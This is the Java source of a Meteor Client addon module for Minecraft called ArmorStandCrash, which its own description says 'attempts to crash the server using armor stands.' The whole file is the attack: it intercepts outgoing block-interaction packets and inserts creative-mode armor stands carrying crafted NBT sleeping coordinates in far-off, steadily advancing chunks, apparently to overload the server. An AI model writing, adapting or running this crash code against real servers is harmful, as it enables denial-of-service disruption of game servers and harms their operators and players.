package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;

public class ArmorStandCrash extends Module {
    private final SettingGroup sgGeneral;
    private final Setting<Boolean> autoDisable;
    private int xChunk;
    private int zChunk;

    public ArmorStandCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Armor Stand Crash", "Attempts to crash the server using armor stands.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.autoDisable = this.sgGeneral.add(((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder()).name("auto-disable")).description("Disables module on kick.")).defaultValue(true)).build());
    }

    public void onActivate() {
        if(!mc.isInSingleplayer()) {
            if (this.mc.player != null && !this.mc.player.getAbilities().creativeMode) {
                this.error("You must be in creative mode to use this.");
                this.toggle();
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onPacketSend(PacketEvent.Send event) {
        if (event.packet instanceof PlayerInteractBlockC2SPacket) {
            ItemStack stack = new ItemStack(Items.ARMOR_STAND);
            NbtCompound tag = new NbtCompound();
            tag.put("SleepingX", NbtInt.of(this.xChunk << 4));
            tag.put("SleepingY", NbtInt.of(0));
            tag.put("SleepingZ", NbtInt.of(this.zChunk * 10 << 4));
            stack.setSubNbt("EntityTag", tag);
            if (this.mc.interactionManager != null) {
                this.mc.interactionManager.clickCreativeStack(stack, 36);
            }
            this.xChunk += 10;
            ++this.zChunk;
        }

    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if ((Boolean)this.autoDisable.get()) {
            this.toggle();
        }

    }
}
